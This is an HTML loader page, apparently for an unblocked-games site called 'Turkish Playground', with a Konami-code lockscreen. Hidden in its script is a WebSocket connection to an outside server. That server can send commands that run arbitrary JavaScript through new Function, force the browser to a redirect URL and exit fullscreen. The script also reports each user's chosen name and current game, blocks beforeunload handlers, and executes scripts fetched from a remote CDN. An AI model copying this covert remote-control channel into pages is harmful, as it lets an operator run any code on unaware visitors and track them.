<!DOCTYPE html>
<html><head><meta charset="UTF-8"></head>
<body style="margin:0;padding:0;background:#000">

<div id="r"></div>
<div id="tp-ui"></div>

<script>
const WS_URL = 'wss://tpws.b-cdn.net';
const KONAMI = ["ArrowUp","ArrowUp","ArrowDown","ArrowDown","ArrowLeft","ArrowRight","ArrowLeft","ArrowRight","b","a","Enter"];

const uiHost = document.getElementById('tp-ui');
const shadow = uiHost.attachShadow({ mode: 'open' });
shadow.innerHTML = `
<style>
  #lockscreen {
    display: none;
    position: fixed;
    inset: 0;
    background: #000;
    color: #f1f5f9;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    text-align: center;
    padding: 2rem;
    z-index: 99999;
  }
  #lockscreen h1 { font-size: 1.6rem; margin-bottom: 1rem; color: #fc2651; }
  #lockscreen p  { color: #94a3b8; margin-bottom: 0.5rem; }
  #lockscreen h2 { font-size: 1rem; font-weight: 400; color: #64748b; margin-top: 1rem; }
  #username-prompt {
    display: none;
    position: fixed;
    inset: 0;
    background: rgba(0,0,0,0.85);
    backdrop-filter: blur(8px);
    z-index: 99998;
    align-items: center;
    justify-content: center;
  }
  .prompt-box {
    background: #0a0a0a;
    border: 1px solid #2a2a2a;
    border-radius: 14px;
    padding: 2rem;
    width: 100%;
    max-width: 360px;
    text-align: center;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
  }
  .prompt-box h3 { color: #f1f5f9; font-size: 1.1rem; margin-bottom: 0.4rem; }
  .prompt-box p  { color: #64748b; font-size: 13px; margin-bottom: 1.25rem; }
  .prompt-box input {
    width: 100%;
    background: #000;
    border: 1px solid #2a2a2a;
    border-radius: 8px;
    color: #f1f5f9;
    font-size: 14px;
    padding: 0.7rem 1rem;
    outline: none;
    font-family: inherit;
    margin-bottom: 0.75rem;
    transition: border-color 0.2s, box-shadow 0.2s;
    box-sizing: border-box;
  }
  .prompt-box input:focus { border-color: #fc2651; box-shadow: 0 0 0 3px rgba(252,38,81,0.15); }
  .prompt-box button {
    width: 100%;
    background: #fc2651;
    color: #fff;
    border: none;
    border-radius: 8px;
    padding: 0.7rem;
    font-size: 14px;
    font-weight: 700;
    cursor: pointer;
    font-family: inherit;
    transition: opacity 0.15s;
  }
  .prompt-box button:hover { opacity: 0.85; }
</style>

<div id="lockscreen">
  <h1>No more Turkish Playground for you! You shall contact the site owner to get the new one.</h1>
  <p>or i might just reject (Lookin at u Jag)</p>
  <h2>This is due to people not doing their work before playing which is badd!!!</h2>
</div>

<div id="username-prompt">
  <div class="prompt-box">
    <h3>One sec</h3>
    <p>Enter a username so the site knows who you are</p>
    <input type="text" id="username-input" placeholder="your name" maxlength="24" autocomplete="off">
    <button id="username-btn">Let's go</button>
  </div>
</div>
`;

const S = {
  lockscreen: shadow.getElementById('lockscreen'),
  prompt: shadow.getElementById('username-prompt'),
  input: shadow.getElementById('username-input'),
  btn: shadow.getElementById('username-btn')
};

let pos = 0;
let ws = null;
let wsReady = false;
let siteLoaded = false;
let locked = localStorage.getItem('unlocked') !== '1';
let currentGameId = null;
let toastItems = [];

if (!localStorage.getItem('tp_temp_username')) {
  localStorage.setItem('tp_temp_username', 'user_' + Math.floor(Math.random() * 9000 + 1000));
}
const tempUsername = localStorage.getItem('tp_temp_username');
let username = localStorage.getItem('tp_username') || tempUsername;

function showPrompt() { S.prompt.style.display = 'flex'; S.input.focus(); }
function hidePrompt() { S.prompt.style.display = 'none'; }
function showLockscreen() { S.lockscreen.style.display = 'flex'; }
function hideLockscreen() { S.lockscreen.style.display = 'none'; }

function getToastContainer() {
  let c = document.getElementById('tp-toast-container');
  if (!c) {
    c = document.createElement('div');
    c.id = 'tp-toast-container';
    c.style.cssText = 'position:fixed!important;top:1.25rem!important;left:50%!important;transform:translateX(-50%)!important;z-index:2147483647!important;display:flex!important;flex-direction:column!important;align-items:center!important;pointer-events:none!important;';
    document.body.appendChild(c);
  }
  return c;
}

function typeText(el, text, speed, onDone) {
  let i = 0;
  el.textContent = '';
  const cursor = document.createElement('span');
  cursor.textContent = '|';
  cursor.style.cssText = 'opacity:1;animation:none;margin-left:1px;color:#fc2651;';
  el.appendChild(cursor);
  function tick() {
    if (i < text.length) {
      cursor.before(text[i]);
      i++;
      setTimeout(tick, speed);
    } else {
      setTimeout(function() {
        cursor.style.cssText = 'opacity:0;transition:opacity 0.3s;margin-left:1px;';
        setTimeout(function() { cursor.remove(); if (onDone) onDone(); }, 300);
      }, 300);
    }
  }
  tick();
}

function showToast(msg, duration) {
  duration = duration || 6000;
  const container = getToastContainer();
  const typingDuration = msg.length * 40;

  const wrapper = document.createElement('div');
  wrapper.style.cssText = 'overflow:hidden!important;max-height:0!important;transition:max-height 0.35s cubic-bezier(0.4,0,0.2,1),margin-bottom 0.35s cubic-bezier(0.4,0,0.2,1)!important;margin-bottom:0!important;';

  const t = document.createElement('div');
  t.style.cssText = 'background:rgba(0,0,0,0.82)!important;backdrop-filter:blur(14px)!important;border:1px solid #fc2651!important;border-radius:12px!important;padding:0.9rem 1.6rem!important;color:#f1f5f9!important;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif!important;font-size:15px!important;font-weight:600!important;width:max-content!important;max-width:55vw!important;text-align:center!important;opacity:0!important;transform:translateY(-6px)!important;transition:opacity 0.3s,transform 0.3s!important;white-space:pre-wrap!important;';

  wrapper.appendChild(t);
  container.insertBefore(wrapper, container.firstChild);
  toastItems.unshift(wrapper);

  requestAnimationFrame(function() {
    requestAnimationFrame(function() {
      wrapper.style.setProperty('max-height', '120px', 'important');
      wrapper.style.setProperty('margin-bottom', '0.5rem', 'important');
      t.style.setProperty('opacity', '1', 'important');
      t.style.setProperty('transform', 'translateY(0)', 'important');
      setTimeout(function() {
        typeText(t, msg, 40, null);
      }, 200);
    });
  });

  setTimeout(function() {
    t.style.setProperty('opacity', '0', 'important');
    t.style.setProperty('transform', 'translateY(-6px)', 'important');
    setTimeout(function() {
      wrapper.style.setProperty('max-height', '0', 'important');
      wrapper.style.setProperty('margin-bottom', '0', 'important');
      setTimeout(function() {
        wrapper.remove();
        toastItems = toastItems.filter(function(x) { return x !== wrapper; });
      }, 350);
    }, 300);
  }, duration + typingDuration);
}

const _origAddEL = EventTarget.prototype.addEventListener;
EventTarget.prototype.addEventListener = function(type, fn, opts) {
  if (type === 'beforeunload') return;
  return _origAddEL.call(this, type, fn, opts);
};
window.onbeforeunload = null;
Object.defineProperty(window, 'onbeforeunload', { set: function(){}, get: function(){ return null; } });

function checkGameId() {
  const params = new URLSearchParams(window.location.search);
  const id = params.get('id') || null;
  if (id !== currentGameId) {
    currentGameId = id;
    sendGameUpdate();
  }
}

function sendGameUpdate() {
  if (wsReady && username) {
    ws.send(JSON.stringify({ type: 'game_update', gameId: currentGameId }));
  }
}

const _origPushState = history.pushState;
history.pushState = function() {
  _origPushState.apply(this, arguments);
  checkGameId();
};
window.addEventListener('popstate', checkGameId);

function saveUsername() {
  const val = S.input.value.trim();
  if (!val) return;
  const oldName = username;
  username = val;
  localStorage.setItem('tp_username', username);
  hidePrompt();
  if (wsReady) {
    ws.send(JSON.stringify({ type: 'self_rename', oldName: oldName, newName: username }));
    ws.send(JSON.stringify({ type: 'identify', username: username }));
    sendGameUpdate();
  }
  if (!locked) loadSite();
}

S.btn.addEventListener('click', saveUsername);
S.input.addEventListener('keydown', function(e) {
  if (e.key === 'Enter') saveUsername();
});

function loadSite() {
  if (siteLoaded) return;
  siteLoaded = true;
  hideLockscreen();

  fetch("https://cdn.jsdelivr.net/gh/CatHead132/CatHead132.github.io@latest/gnupdated.html?t=" + Date.now())
    .then(function(r) { return r.text(); })
    .then(function(h) {
      const d = document.getElementById("r");
      const x = document.createElement("html");
      d.innerHTML = h;
      x.innerHTML = h;

      const t = x.querySelector("title");
      const i = x.querySelector('link[rel*="icon"]');
      if (t) document.title = t.textContent;
      if (i) {
        const f = document.createElement("link");
        f.rel = "icon";
        f.href = i.getAttribute("href");
        document.head.appendChild(f);
      }

      d.querySelectorAll("script").forEach(function(s) {
        const n = document.createElement("script");
        if (s.src) {
          n.src = s.src;
        } else {
          const blob = new Blob([s.textContent], { type: 'text/javascript' });
          n.src = URL.createObjectURL(blob);
        }
        if (s.type) n.type = s.type;
        document.body.appendChild(n);
      });
    }).catch(function() {
      siteLoaded = false;
    });
}

function connectWS() {
  try { ws = new WebSocket(WS_URL); } catch(e) { scheduleReconnect(); return; }

  ws.onopen = function() {
    wsReady = true;
    ws.send(JSON.stringify({ type: 'identify', username: username }));
    sendGameUpdate();
  };

  ws.onmessage = function(e) {
    let msg;
    try { msg = JSON.parse(e.data); } catch(err) { return; }

    if (document.fullscreenElement || document.webkitFullscreenElement) {
      (document.exitFullscreen || document.webkitExitFullscreen || function(){}).call(document);
    }

    if (msg.type === 'rename') {
      username = msg.newName;
      localStorage.setItem('tp_username', username);
    }
    if (msg.type === 'notify') { showToast(msg.message); }
    if (msg.type === 'redirect') {
      const url = /^https?:\/\//i.test(msg.url) ? msg.url : 'https://' + msg.url;
      window.top.location.href = url;
    }
    if (msg.type === 'execjs') {
      try { (new Function(msg.code))(); } catch(err) {}
    }
    if (msg.type === 'lock') {
      locked = true;
      localStorage.removeItem('unlocked');
      location.reload();
    }
    if (msg.type === 'unlock') {
      locked = false;
      localStorage.setItem('unlocked', '1');
      location.reload();
    }
  };

  ws.onclose = function() { wsReady = false; scheduleReconnect(); };
  ws.onerror  = function() { wsReady = false; };
}

function scheduleReconnect() {
  setTimeout(connectWS, 1000);
}

document.addEventListener('keydown', function(e) {
  if (e.key === KONAMI[pos]) {
    pos++;
    if (pos === KONAMI.length) {
      locked = false;
      localStorage.setItem('unlocked', '1');
      pos = 0;
      if (!localStorage.getItem('tp_username')) {
        hideLockscreen();
        showPrompt();
      } else {
        location.reload();
      }
    }
  } else {
    pos = e.key === KONAMI[0] ? 1 : 0;
  }
});

connectWS();

if (locked) {
  showLockscreen();
} else {
  if (!localStorage.getItem('tp_username')) {
    showPrompt();
  } else {
    loadSite();
  }
}
</script>
</body></html>
